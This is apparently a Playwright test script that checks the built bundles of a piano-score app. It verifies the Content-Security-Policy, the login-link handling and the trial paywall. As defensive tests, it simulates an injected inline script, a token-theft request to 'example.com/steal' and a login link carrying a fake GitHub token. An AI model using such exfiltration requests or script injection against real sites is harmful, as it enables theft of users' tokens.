// Security checks on the BUILT files (what is really published / packed), not on the dev server. Usage: node build-security.cjs <webDir> <storeDir>
//  WEB build:   the Content-Security-Policy is there, the normal flows (local library, upload, open + play a score, PDF viewer) cause no violation,
//               an injected inline script does not run, and a request to a server that is not on the list is blocked.
//  STORE build: a login link does nothing (no request to GitHub, no token stored), and the local library works.
const { chromium } = require('playwright'); const http = require('http'); const fs = require('fs'); const path = require('path');
const [webDir, storeDir, paywallDir] = process.argv.slice(2); const FX = path.join(__dirname, '..', 'fixtures');
let fail = 0; const ok = (c, m) => { console.log((c ? 'PASS ' : 'FAIL ') + m); if (!c) fail++; return c; };
const serve = (dir) => new Promise((res) => { const s = http.createServer((q, r) => { let p = decodeURIComponent(q.url.split('?')[0]); if (p.endsWith('/')) p += 'index.html'; const f = path.join(dir, p); if (!f.startsWith(dir) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { r.statusCode = 404; return r.end(); }
  const t = { '.html': 'text/html', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.webmanifest': 'application/manifest+json', '.wasm': 'application/wasm' }[path.extname(f)] || 'application/octet-stream'; r.setHeader('content-type', t); fs.createReadStream(f).pipe(r); }).listen(0, () => res({ s, port: s.address().port })); });
(async () => {
  const browser = await chromium.launch();
  // ---------- WEB ----------
  { const { s, port } = await serve(webDir); const ctx = await browser.newContext({ viewport: { width: 1194, height: 900 }, serviceWorkers: 'block', locale: 'zh-CN' }); const page = await ctx.newPage();
    const viol = []; const errs = [];
    await page.addInitScript(() => { window.__v = []; document.addEventListener('securitypolicyviolation', (e) => window.__v.push(e.violatedDirective + ' ' + e.blockedURI)); });
    const sound = []; page.on('request', (r) => { if (/smpldsnds|gleitz/.test(r.url())) sound.push(r.url()); });
    page.on('pageerror', (e) => errs.push(String(e)));
    await page.goto(`http://localhost:${port}/`);
    ok((await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content').catch(() => '')).includes("default-src 'self'"), 'web build: the Content-Security-Policy is in the page');
    ok((await page.$$eval('script:not([src])', (a) => a.length)) === 0, 'web build: no inline script (the policy can forbid them)');
    await page.waitForSelector('.login'); await page.click('button:has-text("在本机使用")');
    await page.waitForSelector('.home', { timeout: 15000 });
    await page.setInputFiles('input[type=file]:not([accept=".zip,application/zip"])', path.join(FX, 'single.musicxml')); await page.waitForSelector('.listbox .card', { timeout: 15000 });
    await page.click('.listbox .card .open'); await page.waitForSelector('.osmd svg, svg', { timeout: 30000 }); await page.waitForTimeout(1500);
    await page.keyboard.press('Space'); await page.waitForTimeout(2500); // the piano sound is fetched from its server when playing starts
    await page.evaluate(() => (location.hash = '#/')); await page.waitForSelector('.home');
    await page.setInputFiles('input[type=file]:not([accept=".zip,application/zip"])', path.join(FX, 'Test-Piece-for-OCR.pdf')); await page.waitForTimeout(1200);
    if (await page.$('#pdf-notice-ok')) await page.click('#pdf-notice-ok'); await page.waitForTimeout(1500);
    await page.evaluate(() => (location.hash = '#/pdf/Test-Piece-for-OCR.pdf')); await page.waitForSelector('.pdfpage', { timeout: 30000 }); await page.waitForTimeout(1200);
    const v0 = await page.evaluate(() => window.__v.slice());
    ok(v0.length === 0 && errs.length === 0, `web build: home, upload, open + play a score, PDF viewer: no policy violation, no script error (${v0.concat(errs).join(' | ').slice(0, 300) || 'none'}; piano sound requests: ${sound.length})`);
    // the policy really blocks things
    const inj = await page.evaluate(() => { const el = document.createElement('script'); el.textContent = 'window.__injected = 1'; document.head.append(el); return !!window.__injected; });
    ok(!inj, 'web build: an injected inline script does not run');
    const ext = await page.evaluate(() => fetch('https://example.com/steal?x=1').then(() => 'sent', () => 'blocked'));
    ok(ext === 'blocked' && (await page.evaluate(() => window.__v.some((x) => x.startsWith('connect-src')))), 'web build: a request to a server that is not on the list is blocked (a stolen token could not be sent)');
    await ctx.close(); s.close(); }
  // ---------- STORE ----------
  { const { s, port } = await serve(storeDir); const ctx = await browser.newContext({ viewport: { width: 1194, height: 900 }, serviceWorkers: 'block', locale: 'zh-CN' }); const page = await ctx.newPage();
    const gh = []; page.on('request', (r) => { if (/github\.com/.test(r.url())) gh.push(r.url()); });
    await page.goto(`http://localhost:${port}/`); await page.waitForSelector('.home', { timeout: 15000 });
    const payload = Buffer.from(JSON.stringify({ t: 'github_pat_FAKE', r: 'someone/Scores' })).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    await page.evaluate((p) => (location.hash = '#/link/' + p), payload); await page.waitForTimeout(1500);
    const st = await page.evaluate(() => ({ home: !!document.querySelector('.home'), auth: localStorage.getItem('pianist.auth.v1') || sessionStorage.getItem('pianist.auth.v1'), hash: location.hash, local: localStorage.getItem('pianist.storage') }));
    ok(gh.length === 0 && !st.auth && st.home && st.hash === '#/', `store build: a login link does nothing: no request to GitHub, no token stored, back on the home screen (${gh.length} requests)`);
    await page.setInputFiles('input[type=file]:not([accept=".zip,application/zip"])', path.join(FX, 'single.musicxml')); await page.waitForSelector('.listbox .card', { timeout: 15000 });
    ok(gh.length === 0, 'store build: the local library works (upload) and still nothing is sent to GitHub');
    await ctx.close(); s.close(); }
  // ---------- TRIAL / PURCHASE: off unless the build says PAYWALL=1 ----------
  // a pretend App Store: first download 30 days ago, nothing bought = the trial is over
  const expired = () => { window.Capacitor = { getPlatform: () => 'ios', Plugins: { PianistStore: { status: async () => ({ firstInstall: Date.now() - 30 * 86400000, owned: false, price: '1' }), purchase: async () => ({ owned: false }), restore: async () => ({ owned: false }) } } }; };
  for (const [dir, locked, label] of [[storeDir, false, 'default build (PAYWALL off)'], [paywallDir, true, 'PAYWALL=1 build']]) {
    const { s, port } = await serve(dir); const ctx = await browser.newContext({ viewport: { width: 1194, height: 900 }, serviceWorkers: 'block', locale: 'zh-CN' }); const page = await ctx.newPage();
    await page.addInitScript(expired);
    await page.goto(`http://localhost:${port}/`); await page.waitForSelector('.home', { timeout: 15000 });
    await page.setInputFiles('input[type=file]:not([accept=".zip,application/zip"])', path.join(FX, 'single.musicxml')); await page.waitForSelector('.listbox .card', { timeout: 15000 });
    await page.evaluate(() => (location.hash = '#/score/single.musicxml')); await page.waitForTimeout(3000);
    const st = await page.evaluate(() => ({ paywall: !!document.querySelector('dialog#paywall'), opened: !!document.querySelector('.controls .mainrow') }));
    ok(locked ? st.paywall && !st.opened : !st.paywall && st.opened, `trial over (30 days) and nothing bought: ${label} ${locked ? 'asks for the purchase' : 'still opens the score, nothing is locked'}`);
    await ctx.close(); s.close();
  }
  await browser.close(); console.log(fail ? `\n${fail} FAILED` : '\nALL PASSED'); process.exit(fail ? 1 : 0);
})();
